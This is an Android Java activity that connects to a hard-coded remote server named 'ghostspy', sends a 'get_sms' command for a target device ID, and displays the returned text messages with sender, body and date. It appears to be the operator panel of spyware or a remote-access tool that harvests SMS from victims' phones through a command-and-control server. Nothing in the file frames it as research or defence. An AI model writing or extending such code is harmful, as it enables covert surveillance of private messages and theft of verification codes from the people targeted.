package com.testapp;

import android.app.Activity;
import android.os.Bundle;
import android.view.Gravity;
import android.widget.*;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONArray;
import org.json.JSONObject;
import java.net.URISyntaxException;

public class SmsActivity extends Activity {
    private Socket socket;
    private String deviceId;
    private LinearLayout smsContainer;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        deviceId = getIntent().getStringExtra("deviceId");

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(0xFF080808);
        root.setPadding(16, 16, 16, 16);

        TextView title = new TextView(this);
        title.setText("💬 SMS");
        title.setTextColor(0xFFFFFFFF);
        title.setTextSize(20);
        root.addView(title);

        Button refreshBtn = new Button(this);
        refreshBtn.setText("🔄 Refresh");
        refreshBtn.setTextColor(0xFFFFFFFF);
        refreshBtn.setBackgroundColor(0xFF151515);
        refreshBtn.setOnClickListener(v -> requestSms());
        root.addView(refreshBtn);

        ScrollView scroll = new ScrollView(this);
        smsContainer = new LinearLayout(this);
        smsContainer.setOrientation(LinearLayout.VERTICAL);
        smsContainer.setPadding(0, 16, 0, 0);
        scroll.addView(smsContainer);
        root.addView(scroll);

        setContentView(root);

        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
            socket.connect();
        } catch (URISyntaxException e) {}

        socket.on("sms", args -> {
            try {
                String smsStr = args[0].toString();
                JSONArray sms = new JSONArray(smsStr);
                runOnUiThread(() -> displaySms(sms));
            } catch (Exception e) {}
        });

        requestSms();
    }

    private void requestSms() {
        if (socket != null && socket.connected()) {
            JSONObject msg = new JSONObject();
            try {
                msg.put("device_id", deviceId);
                msg.put("command", "get_sms");
                msg.put("params", new JSONObject());
                socket.emit("command", msg);
            } catch (Exception e) {}
        }
    }

    private void displaySms(JSONArray sms) {
        smsContainer.removeAllViews();
        try {
            for (int i = 0; i < sms.length(); i++) {
                JSONObject s = sms.getJSONObject(i);
                LinearLayout card = new LinearLayout(this);
                card.setOrientation(LinearLayout.VERTICAL);
                card.setBackgroundColor(0xFF151515);
                card.setPadding(16, 16, 16, 16);
                LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                        LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
                lp.setMargins(0, 0, 0, 8);
                card.setLayoutParams(lp);

                TextView addrView = new TextView(this);
                addrView.setText("📞 " + s.optString("address"));
                addrView.setTextColor(0xFFFF1744);
                card.addView(addrView);

                TextView bodyView = new TextView(this);
                bodyView.setText(s.optString("body"));
                bodyView.setTextColor(0xFFFFFFFF);
                card.addView(bodyView);

                TextView dateView = new TextView(this);
                dateView.setText(s.optString("date"));
                dateView.setTextColor(0xFF9AA3B2);
                card.addView(dateView);

                smsContainer.addView(card);
            }
        } catch (Exception e) {}
    }

    @Override
    protected void onDestroy() {
        if (socket != null) socket.disconnect();
        super.onDestroy();
    }
}
